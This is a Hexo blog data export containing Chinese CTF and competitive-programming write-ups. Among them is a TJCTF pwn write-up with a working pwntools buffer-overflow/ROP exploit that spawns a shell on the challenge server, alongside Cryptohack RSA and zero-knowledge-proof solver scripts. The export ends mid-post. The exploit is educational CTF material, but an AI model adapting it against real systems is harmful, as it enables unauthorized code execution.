{"meta":{"title":"Hexo","subtitle":"","description":"hi","author":null,"url":"https://archer-baiyi.github.io","root":"/"},"pages":[{"title":"","date":"2025-03-28T23:35:22.524Z","updated":"2025-03-28T23:33:52.530Z","comments":true,"path":"googlecbf54c20e5418f2c.html","permalink":"https://archer-baiyi.github.io/googlecbf54c20e5418f2c.html","excerpt":"","text":"google-site-verification: googlecbf54c20e5418f2c.html"},{"title":"所有分类","date":"2025-03-03T17:43:08.659Z","updated":"2025-03-03T17:43:08.659Z","comments":true,"path":"categories/index.html","permalink":"https://archer-baiyi.github.io/categories/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2025-03-03T17:42:52.310Z","updated":"2025-03-03T17:42:52.310Z","comments":true,"path":"tags/index.html","permalink":"https://archer-baiyi.github.io/tags/index.html","excerpt":"","text":""},{"title":"","date":"2025-04-05T21:06:21.350Z","updated":"2025-04-05T21:06:21.350Z","comments":true,"path":"about/index.html","permalink":"https://archer-baiyi.github.io/about/index.html","excerpt":"","text":"数学研究生，CTF萌新"},{"title":"友链","date":"2025-03-09T23:52:24.022Z","updated":"2025-03-09T23:52:24.022Z","comments":true,"path":"friends/index.html","permalink":"https://archer-baiyi.github.io/friends/index.html","excerpt":"","text":""}],"posts":[{"title":"TJCTF 2025 pwn/i-love-birds Writeup","slug":"CTF/Pwn/TJCTF-2025-pwn-i-love-birds-Writeup","date":"2025-06-09T09:53:30.000Z","updated":"2025-06-09T10:15:25.757Z","comments":true,"path":"2025/06/09/CTF/Pwn/TJCTF-2025-pwn-i-love-birds-Writeup/","permalink":"https://archer-baiyi.github.io/2025/06/09/CTF/Pwn/TJCTF-2025-pwn-i-love-birds-Writeup/","excerpt":"TJCTF 2025比赛的Pwn题i-love-birds的题解","text":"题目 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void gadget() &#123; asm(&quot;push $0x69;pop %rdi&quot;);&#125;void win(int secret) &#123; if (secret == 0xA1B2C3D4) &#123; system(&quot;/bin/sh&quot;); &#125;&#125;int main() &#123; setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stdin, NULL, _IONBF, 0); unsigned int canary = 0xDEADBEEF; char buf[64]; puts(&quot;I made a canary to stop buffer overflows. Prove me wrong!&quot;); gets(buf); if (canary != 0xDEADBEEF) &#123; puts(&quot;No stack smashing for you!&quot;); exit(1); &#125; return 0;&#125; 分析首先注意到这道题最核心的漏洞： 12char buf[64];gets(buf); 也就是利用Buffer Overflow。 虽然说设置了Stack Canary，但是由于知道它的值，直接在Oveflow的时候保证它的值没有被修改即可。 我们一共需要做到2件事情： 调用win()函数 给win()函数传递0xA1B2C3D4作为参数 在IDA的Exports页面便可直接查看win()函数的地址： 1win 00000000004011C4 其次便是传递参数了。首先查看gadget()函数（在上面的Exports页面直接点击gadget`即可）： 12345678text:00000000004011B6 endbr64.text:00000000004011BA push rbp.text:00000000004011BB mov rbp, rsp.text:00000000004011BE push 69h ; &#x27;i&#x27;.text:00000000004011C0 pop rdi.text:00000000004011C1 nop.text:00000000004011C2 pop rbp.text:00000000004011C3 retn 发现我们可以直接利用pop rdi以及retn/ret来传递参数。不过这里和最常见的pop rdi; ret不同的是，这两个命令中间还隔了其他内容，所以我们需要在中间部分插入Padding保证所有的位置都是正确的。 除了直接查看gadget()函数，我们还可以直接通过使用Alt + t搜索”pop“ 或者是通过Alt + B搜索”5F“ 来找到pop rdi这条命令。（如果是查找pop rdi; ret的话则需要搜索”5F C3“） 最后再查看一下main()函数的Stack的结构： Exploit1234567891011121314151617181920from pwn import *r = remote(&quot;tjc.tf&quot;, 31625)payload = 76 * b&quot;A&quot; # 填满 bufpayload += p32(0xDEADBEEF) # 修复 canary（4字节）payload += 8 * b&quot;C&quot; # saved RBP（可以随便）payload += p64(0x4011c0) # gadget: pop rdipayload += p64(0xA1B2C3D4) # 参数，传入 win()payload+=p64(0x00) # rbp的Padding payload += p64(0x4011C4) # win() 函数地址r.recvuntil(b&quot;Prove me wrong!&quot;)r.sendline(payload)r.interactive()# ls# flag.txt# run# cat flag.txt# tjctf&#123;1_gu355_y0u_f0und_th3_f4ke_b1rd_ch1rp_CH1rp_cH1Rp_Ch1rP_ch1RP&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/categories/CTF/Pwn/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/tags/Pwn/"}]},{"title":"Codeforces Round 1029 (Div. 3) Writeup","slug":"算法竞赛/Codeforce/Codeforces-Round-1029-Div-3-Writeup","date":"2025-06-08T15:52:05.000Z","updated":"2025-06-08T17:57:23.754Z","comments":true,"path":"2025/06/08/算法竞赛/Codeforce/Codeforces-Round-1029-Div-3-Writeup/","permalink":"https://archer-baiyi.github.io/2025/06/08/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/Codeforces-Round-1029-Div-3-Writeup/","excerpt":"","text":"A. False Alarm题目 思路首先先遍历Array直到找到第一个1，即关着的门。然后这个时候使用开关，看是否能到达终点，或者是到达的位置后面是否存在关着的门。 简化下来就是：首先找到第一个关着的门的位置，然后确定最后一个关着的门的位置，最后根据他们的距离是否小于x的值来判断是否可以通行。 代码123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n, x; cin &gt;&gt; n &gt;&gt; x; vector&lt;int&gt; a(n); for (int &amp;v : a) cin &gt;&gt; v; int first = -1, last = -1; for (int i = 0; i &lt; n; ++i) { if (a[i] == 1) { if (first == -1) first = i; // 第一次遇到关门 last = i; // 不断刷新最后一次 } } // 必有关门，所以 first、last 一定都被赋值 if (last - first + 1 &lt;= x) cout &lt;&lt; \"YES\\n\"; else cout &lt;&lt; \"NO\\n\"; } return 0;} B. Shrink题目 思路不难发现，对于任意的n，我们只需要构造一个这样的数列即可满足要求： 1,3,5,..,n-1,n,n-2,...,2即前半段是基数递增，后半段是偶数递减。 代码12345678910111213141516171819202122232425#include &lt;iostream&gt;using namespace std;int main() { int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; // 奇数 for (int i = 1; i &lt;= n; i += 2) { cout &lt;&lt; i &lt;&lt; \" \"; } // 偶数 int start = (n % 2 == 0) ? n : n - 1; for (int i = start; i &gt;= 2; i -= 2) { cout &lt;&lt; i &lt;&lt; \" \"; } cout &lt;&lt; '\\n'; } return 0;}","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"}]},{"title":"Cyptohack ZKPs Writeup","slug":"CTF/Crypto/Cyptohack-ZKPs-Writeup","date":"2025-06-07T07:08:55.000Z","updated":"2025-06-07T09:08:22.759Z","comments":true,"path":"2025/06/07/CTF/Crypto/Cyptohack-ZKPs-Writeup/","permalink":"https://archer-baiyi.github.io/2025/06/07/CTF/Crypto/Cyptohack-ZKPs-Writeup/","excerpt":"","text":"什么是零知识证明A zero-knowledge proof (ZKP) is a technique that enables one party (the prover) to demonstrate to another party (the verifier) the truth of a certain statement without revealing any additional information besides the fact that the statement is true. The core idea behind zero-knowledge proofs is that while it’s straightforward to prove you have certain knowledge by disclosing it, the real challenge lies in proving you have that knowledge without actually revealing the knowledge itself or any details about it. 零知识证明（Zero-Knowledge Proof，简称ZKP）是一种技术，使一方（称为“证明者”）能够向另一方（称为“验证者”）证明某个陈述的真实性，同时不泄露除该陈述为真这一事实以外的任何其他信息。零知识证明的核心理念在于：尽管通过直接披露信息来证明自己拥有某种知识是较为直接的方式，但真正的挑战在于如何在不暴露该知识本身或其任何细节的前提下，仍能证明自己确实掌握了这项知识。 例子：你需要向你的一位色盲朋友维克多证明，两只形状完全相同的球（一只是红色，另一只是绿色）是不同的，但又不能透露哪只是红的、哪只是绿的。为此，你采用了一种特定的证明系统。 你先向维克多展示这两只球。他由于无法分辨颜色，看不出它们的区别。接着他将球藏起来，随机选出一只给你看，然后可能会将它换成另一只，也可能不换，再次展示给你。你需要判断他是否交换了球。由于你能通过颜色分辨球的不同，你每次都能准确判断他是否更换了球。 这个过程重复足够多的次数（例如50次），而你每次都能正确识别是否换了球，这让维克多确信两只球确实不同，但他依然无法得知哪只是红色，哪只是绿色。这个证明过程没有泄露除“这两只球不同”之外的任何信息，因此，这是一个零知识证明的例子。 Sigma ProtocolZKP Introduction题 解1crypto&#123;1985&#125; 论文链接：https://dl.acm.org/doi/10.1145/22145.22178https://dl.acm.org/doi/pdf/10.1145/22145.22178 Proofs of Knowledge题 注意到： g^z \\equiv g^{r+ew} \\equiv g^r \\cdot (g^w)^e \\equiv ay^e \\text{ mod } p 论文链接：https://cs.au.dk/~ivan/Sigma.pdf 附件： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354import randomfrom utils import listenerFLAG = &quot;crypto&#123;????????????????????????&#125;&quot;# Diffie-Hellman group (512 bits)# p = 2*q + 1 where p,q are both prime, and 2 modulo p generates a group of order qp = 0x1ed344181da88cae8dc37a08feae447ba3da7f788d271953299e5f093df7aaca987c9f653ed7e43bad576cc5d22290f61f32680736be4144642f8bea6f5bf55efq = 0xf69a20c0ed4465746e1bd047f57223dd1ed3fbc46938ca994cf2f849efbd5654c3e4fb29f6bf21dd6abb662e911487b0f9934039b5f20a23217c5f537adfaaf7g = 2# w,y for the relation `g^w = y mod P` we want to prove knowledge of# w = random.randint(0,q)# y = pow(g,w,P)w = 0x5a0f15a6a725003c3f65238d5f8ae4641f6bf07ebf349705b7f1feda2c2b051475e33f6747f4c8dc13cd63b9dd9f0d0dd87e27307ef262ba68d21a238be00e83y = 0x514c8f56336411e75d5fa8c5d30efccb825ada9f5bf3f6eb64b5045bacf6b8969690077c84bea95aab74c24131f900f83adf2bfe59b80c5a0d77e8a9601454e5assert (y%p) &gt;= 1assert pow(y, q, p) == 1class Challenge: def __init__(self): self.before_input = &quot;Prove to me that you know an w such that g^w = y mod p. Send me a = g^r mod p for some random r in range(q)\\n&quot; self.state = &quot;CHALLENGE&quot; def challenge(self, msg): if self.state == &quot;CHALLENGE&quot;: # Prover sends a randomly sampled `A` value from Z_p* to verifier self.a = msg[&quot;a&quot;] if (self.a%p) &lt; 1 or pow(self.a, q, p) != 1: self.exit = True return &#123;&quot;error&quot;: &quot;Invalid value&quot;&#125; # Verifier sends a random challenge sampled from range(0, 2^t) where 2^t &lt;= q self.e = random.randint(0,2**511) self.state = &quot;PROVE&quot; return &#123;&quot;e&quot;: self.e, &quot;message&quot;: &quot;send me z = r + e*w mod q&quot;&#125; elif self.state == &quot;PROVE&quot;: # Prover sends z = r + e*w mod q to the Verifier z = msg[&quot;z&quot;] self.exit = True # Verifier checks g^z = A*h^e mod p if pow(g,z,p) == (self.a*pow(y,self.e,p)) % p: return &#123;&quot;flag&quot;: FLAG, &quot;message&quot;: &quot;You convinced me you know an `w` such that g^w = y mod p!&quot;&#125; else: return &#123;&quot;error&quot;: &quot;something went wrong :(&quot;&#125;import builtins; builtins.Challenge = Challenge # hack to enable challenge to be run locally, see https://cryptohack.org/faq/#listenerlistener.start_server(port=13425) 解注意，这里给服务器发送参数必须用JSON格式，它返回的也都是这个格式的。 1234567891011121314151617181920212223242526272829from pwn import *import jsonimport randomp = 0x1ed344181da88cae8dc37a08feae447ba3da7f788d271953299e5f093df7aaca987c9f653ed7e43bad576cc5d22290f61f32680736be4144642f8bea6f5bf55efq = 0xf69a20c0ed4465746e1bd047f57223dd1ed3fbc46938ca994cf2f849efbd5654c3e4fb29f6bf21dd6abb662e911487b0f9934039b5f20a23217c5f537adfaaf7g = 2w = 0x5a0f15a6a725003c3f65238d5f8ae4641f6bf07ebf349705b7f1feda2c2b051475e33f6747f4c8dc13cd63b9dd9f0d0dd87e27307ef262ba68d21a238be00e83r = remote(&quot;socket.cryptohack.org&quot;, 13425)random_r = random.randint(0, q)a = pow(g, random_r, p)# 发送 a，注意是 JSON 格式r.sendafter(b&quot;for some random r in range(q)\\n&quot;,json.dumps(&#123;&quot;a&quot;: a&#125;).encode())line = r.recvline()response = json.loads(line.decode())e = response[&quot;e&quot;]z = (random_r + e * w) % qr.sendline(json.dumps(&#123;&quot;z&quot;: z&#125;).encode())print(r.recvline().decode())# &#123;&quot;flag&quot;: &quot;crypto&#123;sigma_protocol_complete!&#125;&quot;, &quot;message&quot;: &quot;You convinced me you know an `w` such that g^w = y mod p!&quot;&#125; Special Soundness简单来讲就是如果2次证明使用的是一个a，那么就可以通过这些传递的参数计算出w来。 题 解这道题依旧用的上面提到的Protocol。 由于可以任意挑选$e$的值，所以最简单的办法就是第一轮选择$e_1=1$，第二轮选择$e_2=2$，那么（由于$a_1=a_2$）就有： z_2-z_1 \\equiv (r_1+e_1w) - (r_2+e_2w) \\equiv w \\text{ mod } q1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from pwn import *import jsonimport randomfrom Crypto.Util.number import long_to_bytesp = 0x1ed344181da88cae8dc37a08feae447ba3da7f788d271953299e5f093df7aaca987c9f653ed7e43bad576cc5d22290f61f32680736be4144642f8bea6f5bf55efq = 0xf69a20c0ed4465746e1bd047f57223dd1ed3fbc46938ca994cf2f849efbd5654c3e4fb29f6bf21dd6abb662e911487b0f9934039b5f20a23217c5f537adfaaf7g = 2r = remote(&quot;socket.cryptohack.org&quot;, 13426)# 第一轮r.recvuntil(b&quot;such that y = g^w mod p.\\n&quot;)line = r.recvline()response1 = json.loads(line.decode())a1 = response1[&quot;a&quot;]print(response1[&quot;message&quot;])# send random e in range 0 &lt;= e &lt; 2^511e = 1r.sendline(json.dumps(&#123;&quot;e&quot;: e&#125;).encode())line = r.recvline()response1 = json.loads(line.decode())z1 = response1[&quot;z&quot;]print(response1[&quot;message&quot;])# not convinced? I&#x27;ll happily do it again!# --------------------------------------------------------------------# 第二轮line = r.recvline()response2 = json.loads(line.decode())a2 = response2[&quot;a2&quot;]print(response2[&quot;message&quot;])# send random e in range 0 &lt;= e &lt; 2^511e = 2r.sendline(json.dumps(&#123;&quot;e&quot;: e&#125;).encode())line = r.recvline()response2 = json.loads(line.decode())z2 = response2[&quot;z2&quot;]print(response1[&quot;message&quot;])# not convinced? I&#x27;ll happily do it again!# --------------------------------------------------------------------w = long_to_bytes((z2-z1)%q)print(w)# b&#x27;crypto&#123;specially_sound_sigmas&#125;\\xf7c\\xb0H\\xa1j\\t\\x9f\\x9ab`%\\xf7\\xe3\\x1552\\x15\\xda%\\xf7\\xf5yk\\xd2\\xa7\\x1f\\xbb3\\x8f\\xfd&amp;&#x27; 当然其实选择随机的$e$也可以计算出$w$： w \\equiv (z_2-z_1) \\cdot (e_2-e_1)^{-1} \\text{ mod } q1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from pwn import *import jsonimport randomfrom Crypto.Util.number import long_to_bytesp = 0x1ed344181da88cae8dc37a08feae447ba3da7f788d271953299e5f093df7aaca987c9f653ed7e43bad576cc5d22290f61f32680736be4144642f8bea6f5bf55efq = 0xf69a20c0ed4465746e1bd047f57223dd1ed3fbc46938ca994cf2f849efbd5654c3e4fb29f6bf21dd6abb662e911487b0f9934039b5f20a23217c5f537adfaaf7g = 2r = remote(&quot;socket.cryptohack.org&quot;, 13426)# 第一轮r.recvuntil(b&quot;such that y = g^w mod p.\\n&quot;)line = r.recvline()response1 = json.loads(line.decode())a1 = response1[&quot;a&quot;]print(response1[&quot;message&quot;])# send random e in range 0 &lt;= e &lt; 2^511e1 = randint(0,2**511)r.sendline(json.dumps(&#123;&quot;e&quot;: e1&#125;).encode())line = r.recvline()response1 = json.loads(line.decode())z1 = response1[&quot;z&quot;]print(response1[&quot;message&quot;])# not convinced? I&#x27;ll happily do it again!# --------------------------------------------------------------------# 第二轮line = r.recvline()response2 = json.loads(line.decode())a2 = response2[&quot;a2&quot;]print(response2[&quot;message&quot;])# send random e in range 0 &lt;= e &lt; 2^511e2 = randint(0,2**511)r.sendline(json.dumps(&#123;&quot;e&quot;: e2&#125;).encode())line = r.recvline()response2 = json.loads(line.decode())z2 = response2[&quot;z2&quot;]print(response1[&quot;message&quot;])# not convinced? I&#x27;ll happily do it again!# --------------------------------------------------------------------w = long_to_bytes((z2-z1) * pow(e2-e1,-1,q)%q)print(w)# b&#x27;crypto&#123;specially_sound_sigmas&#125;\\xf7c\\xb0H\\xa1j\\t\\x9f\\x9ab`%\\xf7\\xe3\\x1552\\x15\\xda%\\xf7\\xf5yk\\xd2\\xa7\\x1f\\xbb3\\x8f\\xfd&amp;&#x27; **题解**题解","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://archer-baiyi.github.io/tags/Crypto/"},{"name":"Cryptohack","slug":"Cryptohack","permalink":"https://archer-baiyi.github.io/tags/Cryptohack/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Zero-knowledge proofs","slug":"Zero-knowledge-proofs","permalink":"https://archer-baiyi.github.io/tags/Zero-knowledge-proofs/"},{"name":"零知识证明","slug":"零知识证明","permalink":"https://archer-baiyi.github.io/tags/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/"}]},{"title":"Cyptohack Public-Key_Cryptography Writeup","slug":"CTF/Crypto/Cyptohack-Public-Key-Cryptography-Writeup","date":"2025-06-03T18:29:30.000Z","updated":"2025-06-04T15:14:35.566Z","comments":true,"path":"2025/06/03/CTF/Crypto/Cyptohack-Public-Key-Cryptography-Writeup/","permalink":"https://archer-baiyi.github.io/2025/06/03/CTF/Crypto/Cyptohack-Public-Key-Cryptography-Writeup/","excerpt":"","text":"这个Course里有很大一部分都是关于RSA加密的。关于RSA的基本原理以及基本的攻击方法可以看我的另一篇博客：RSA加解密以及攻击方法。 Modular Exponentiation题 解12print(pow(101,17,22663))# 19906 Public Keys题 解12print(pow(12,65537,17*23))# 301 Euler’s Totient题 解12345p = 857504083339712752489993810777q = 1029224947942998075080348647219phi = (p-1)*(q-1)print(phi)# 882564595536224140639625987657529300394956519977044270821168 Private Keys题 解1234567p = 857504083339712752489993810777q = 1029224947942998075080348647219phi = (p-1)*(q-1)e = 65537d = pow(e,-1,phi)print(d)# 121832886702415731577073962957377780195510499965398469843281 RSA Decryption题 解不难发现这个N就是前几道题给的p,q的乘积。 1234567891011p = 857504083339712752489993810777q = 1029224947942998075080348647219N = 882564595536224140639625987659416029426239230804614613279163assert N == p*qphi = (p-1)*(q-1)e = 65537d = pow(e,-1,phi)c = 77578995801157823671636298847186723593814843845525223303932m = pow(c,d,N)print(m)# 13371337 RSA Signatures题 解12345678910111213141516from Crypto.Hash import SHA256from Crypto.Util.number import bytes_to_longN = 15216583654836731327639981224133918855895948374072384050848479908982286890731769486609085918857664046075375253168955058743185664390273058074450390236774324903305663479046566232967297765731625328029814055635316002591227570271271445226094919864475407884459980489638001092788574811554149774028950310695112688723853763743238753349782508121985338746755237819373178699343135091783992299561827389745132880022259873387524273298850340648779897909381979714026837172003953221052431217940632552930880000919436507245150726543040714721553361063311954285289857582079880295199632757829525723874753306371990452491305564061051059885803d = 11175901210643014262548222473449533091378848269490518850474399681690547281665059317155831692300453197335735728459259392366823302405685389586883670043744683993709123180805154631088513521456979317628012721881537154107239389466063136007337120599915456659758559300673444689263854921332185562706707573660658164991098457874495054854491474065039621922972671588299315846306069845169959451250821044417886630346229021305410340100401530146135418806544340908355106582089082980533651095594192031411679866134256418292249592135441145384466261279428795408721990564658703903787956958168449841491667690491585550160457893350536334242689message = b&quot;crypto&#123;Immut4ble_m3ssag1ng&#125;&quot;h = SHA256.new(message).digest()h_int = bytes_to_long(h)signature = pow(h_int, d, N)print(signature)# 13480738404590090803339831649238454376183189744970683129909766078877706583282422686710545217275797376709672358894231550335007974983458408620258478729775647818876610072903021235573923300070103666940534047644900475773318682585772698155617451477448441198150710420818995347235921111812068656782998168064960965451719491072569057636701190429760047193261886092862024118487826452766513533860734724124228305158914225250488399673645732882077575252662461860972889771112594906884441454355959482925283992539925713424132009768721389828848907099772040836383856524605008942907083490383109757406940540866978237471686296661685839083475 Factoring题 解使用 http://www.factordb.com/index.php 得到p,q 12p = 19704762736204164635843q = 25889363174021185185929 Monoprime题 1234n = 171731371218065444125482536302245915415603318380280392385291836472299752747934607246477508507827284075763910264995326010251268493630501989810855418416643352631102434317900028697993224868629935657273062472544675693365930943308086634291936846505861203914449338007760990051788980485462592823446469606824421932591 e = 65537ct = 161367550346730604451454756189028938964941280347662098798775466019463375610700074840105776873791605070092554650190486030367121011578171525759600774739890458414593857709994072516290998135846956596662071379067305011746842247628316996977338024343628757374524136260758515864509435302781735938531030576289086798942 解12345678910from Crypto.Util.number import long_to_bytes, inversen = 171731371218065444125482536302245915415603318380280392385291836472299752747934607246477508507827284075763910264995326010251268493630501989810855418416643352631102434317900028697993224868629935657273062472544675693365930943308086634291936846505861203914449338007760990051788980485462592823446469606824421932591e = 65537ct = 161367550346730604451454756189028938964941280347662098798775466019463375610700074840105776873791605070092554650190486030367121011578171525759600774739890458414593857709994072516290998135846956596662071379067305011746842247628316996977338024343628757374524136260758515864509435302781735938531030576289086798942d = inverse(e, n-1)m = pow(ct, d, n)print(long_to_bytes(m))# b&#x27;crypto&#123;0n3_pr1m3_41n7_pr1m3_l0l&#125;&#x27; Manyprime题 解可以使用sage的ecm.factor()函数： 12345678910111213141516171819from Crypto.Util.number import long_to_bytesfrom sage.all import *n = 580642391898843192929563856870897799650883152718761762932292482252152591279871421569162037190419036435041797739880389529593674485555792234900969402019055601781662044515999210032698275981631376651117318677368742867687180140048715627160641771118040372573575479330830092989800730105573700557717146251860588802509310534792310748898504394966263819959963273509119791037525504422606634640173277598774814099540555569257179715908642917355365791447508751401889724095964924513196281345665480688029639999472649549163147599540142367575413885729653166517595719991872223011969856259344396899748662101941230745601719730556631637e = 65537ct = 320721490534624434149993723527322977960556510750628354856260732098109692581338409999983376131354918370047625150454728718467998870322344980985635149656977787964380651868131740312053755501594999166365821315043312308622388016666802478485476059625888033017198083472976011719998333985531756978678758897472845358167730221506573817798467100023754709109274265835201757369829744113233607359526441007577850111228850004361838028842815813724076511058179239339760639518034583306154826603816927757236549096339501503316601078891287408682099750164720032975016814187899399273719181407940397071512493967454225665490162619270814464factors = ecm.factor(n)phi = prod([f - 1 for f in factors])d = inverse_mod(e, phi)m = pow(ct, d, n)flag = long_to_bytes(m)print(flag.decode())# crypto&#123;700_m4ny_5m4ll_f4c70r5&#125; Salty题 1234567891011121314151617181920212223242526#!/usr/bin/env python3from Crypto.Util.number import getPrime, inverse, bytes_to_long, long_to_bytese = 1d = -1while d == -1: p = getPrime(512) q = getPrime(512) phi = (p - 1) * (q - 1) d = inverse(e, phi)n = p * qflag = b&quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;pt = bytes_to_long(flag)ct = pow(pt, e, n)print(f&quot;n = &#123;n&#125;&quot;)print(f&quot;e = &#123;e&#125;&quot;)print(f&quot;ct = &#123;ct&#125;&quot;)pt = pow(ct, d, n)decrypted = long_to_bytes(pt)assert decrypted == flag 123n = 110581795715958566206600392161360212579669637391437097703685154237017351570464767725324182051199901920318211290404777259728923614917211291562555864753005179326101890427669819834642007924406862482343614488768256951616086287044725034412802176312273081322195866046098595306261781788276570920467840172004530873767 e = 1ct = 44981230718212183604274785925793145442655465025264554046028251311164494127485 解e选的是1，根本没有起到任何加密的效果。 1234567from Crypto.Util.number import long_to_bytesn = 110581795715958566206600392161360212579669637391437097703685154237017351570464767725324182051199901920318211290404777259728923614917211291562555864753005179326101890427669819834642007924406862482343614488768256951616086287044725034412802176312273081322195866046098595306261781788276570920467840172004530873767 e = 1ct = 44981230718212183604274785925793145442655465025264554046028251311164494127485flag = long_to_bytes(ct)print(flag)# b&#x27;crypto&#123;saltstack_fell_for_this!&#125;&#x27; Modulus Inutilis题 1234567891011121314151617181920212223242526#!/usr/bin/env python3from Crypto.Util.number import getPrime, inverse, bytes_to_long, long_to_bytese = 3d = -1while d == -1: p = getPrime(1024) q = getPrime(1024) phi = (p - 1) * (q - 1) d = inverse(e, phi)n = p * qflag = b&quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;pt = bytes_to_long(flag)ct = pow(pt, e, n)print(f&quot;n = &#123;n&#125;&quot;)print(f&quot;e = &#123;e&#125;&quot;)print(f&quot;ct = &#123;ct&#125;&quot;)pt = pow(ct, d, n)decrypted = long_to_bytes(pt)assert decrypted == flag 123n = 17258212916191948536348548470938004244269544560039009244721959293554822498047075403658429865201816363311805874117705688359853941515579440852166618074161313773416434156467811969628473425365608002907061241714688204565170146117869742910273064909154666642642308154422770994836108669814632309362483307560217924183202838588431342622551598499747369771295105890359290073146330677383341121242366368309126850094371525078749496850520075015636716490087482193603562501577348571256210991732071282478547626856068209192987351212490642903450263288650415552403935705444809043563866466823492258216747445926536608548665086042098252335883e = 3ct = 243251053617903760309941844835411292373350655973075480264001352919865180151222189820473358411037759381328642957324889519192337152355302808400638052620580409813222660643570085177957 解e选的太小了，且ct也比n小很多，所以直接开3次根就好。 123456789from sympy import rootfrom Crypto.Util.number import long_to_bytesn = 17258212916191948536348548470938004244269544560039009244721959293554822498047075403658429865201816363311805874117705688359853941515579440852166618074161313773416434156467811969628473425365608002907061241714688204565170146117869742910273064909154666642642308154422770994836108669814632309362483307560217924183202838588431342622551598499747369771295105890359290073146330677383341121242366368309126850094371525078749496850520075015636716490087482193603562501577348571256210991732071282478547626856068209192987351212490642903450263288650415552403935705444809043563866466823492258216747445926536608548665086042098252335883e = 3ct = 243251053617903760309941844835411292373350655973075480264001352919865180151222189820473358411037759381328642957324889519192337152355302808400638052620580409813222660643570085177957flag = root(ct, e)print(long_to_bytes(flag))# b&#x27;crypto&#123;N33d_m04R_p4dd1ng&#125;&#x27; Working with Fields题 解1234p=991g=209print(pow(g,-1,p))# 569 Generators of Groups题 解设g为$\\mathbb{F}_p$的 primitive element，则有 g^{p-1} \\equiv 1 \\text{ mod }p并且 \\forall k \\leq p-1: g^{k} \\not\\equiv 1 \\text{ mod }p实际上因为费马小定理，所有的元素都满足第一个等式，并且根据拉格朗日定理可以得到所有元素的order都是$p-1$的因数。所以有 g \\in \\mathbb{F}_p \\text{ is primitive} \\Longleftrightarrow \\forall p_i \\mid p: g^{p_i} \\not\\equiv 1 \\text{ mod }p利用这个办法我们可以快速判断一个元素是否是primitive element。 1234567891011121314151617181920from sympy import isprime, factorintdef find_primitive_root(p): assert isprime(p) phi = p - 1 factors = factorint(phi).keys() for g in range(2, p): is_primitive = True for q in factors: if pow(g, phi // q, p) == 1: is_primitive = False break if is_primitive: return gp = 28151primitive = find_primitive_root(p)print(primitive)# 7 Computing Public Values题 解123456g=2p=2410312426921032588552076022197566074856950548502459942654116941958108831682612228890093858261341614673227141477904012196503648957050582631942730706805009223062734745341073406696246014589361659774041027169249453200378729434170325843778659198143763193776859869524088940195577346119843545301547043747207749969763750084308926339295559968882457872412993810129130294592999947926365264059284647209730384947211681434464714438488520940127459844288859336526896320919633919a=972107443837033796245864316200458246846904598488981605856765890478853088246897345487328491037710219222038930943365848626194109830309179393018216763327572120124760140018038673999837643377590434413866611132403979547150659053897355593394492586978400044375465657296027592948349589216415363722668361328689588996541370097559090335137676411595949335857341797148926151694299575970292809805314431447043469447485957669949989090202320234337890323293401862304986599884732815A=pow(g,a,p)print(A)# 1806857697840726523322586721820911358489420128129248078673933653533930681676181753849411715714173604352323556558783759252661061186320274214883104886050164368129191719707402291577330485499513522368289395359523901406138025022522412429238971591272160519144672389532393673832265070057319485399793101182682177465364396277424717543434017666343807276970864475830391776403957550678362368319776566025118492062196941451265638054400177248572271342548616103967411990437357924 Computing Shared Secrets题 解1234567891011g=2p=2410312426921032588552076022197566074856950548502459942654116941958108831682612228890093858261341614673227141477904012196503648957050582631942730706805009223062734745341073406696246014589361659774041027169249453200378729434170325843778659198143763193776859869524088940195577346119843545301547043747207749969763750084308926339295559968882457872412993810129130294592999947926365264059284647209730384947211681434464714438488520940127459844288859336526896320919633919A=70249943217595468278554541264975482909289174351516133994495821400710625291840101960595720462672604202133493023241393916394629829526272643847352371534839862030410331485087487331809285533195024369287293217083414424096866925845838641840923193480821332056735592483730921055532222505605661664236182285229504265881752580410194731633895345823963910901731715743835775619780738974844840425579683385344491015955892106904647602049559477279345982530488299847663103078045601b=12019233252903990344598522535774963020395770409445296724034378433497976840167805970589960962221948290951873387728102115996831454482299243226839490999713763440412177965861508773420532266484619126710566414914227560103715336696193210379850575047730388378348266180934946139100479831339835896583443691529372703954589071507717917136906770122077739814262298488662138085608736103418601750861698417340264213867753834679359191427098195887112064503104510489610448294420720B=5183869567900415799280568159142218375992345516551445851334147278389771457772133830180966625168143025838418589010218222735051207284517884129679718090388540906707432651871382081693551554118830635418812092889677356841524732606877996641309569694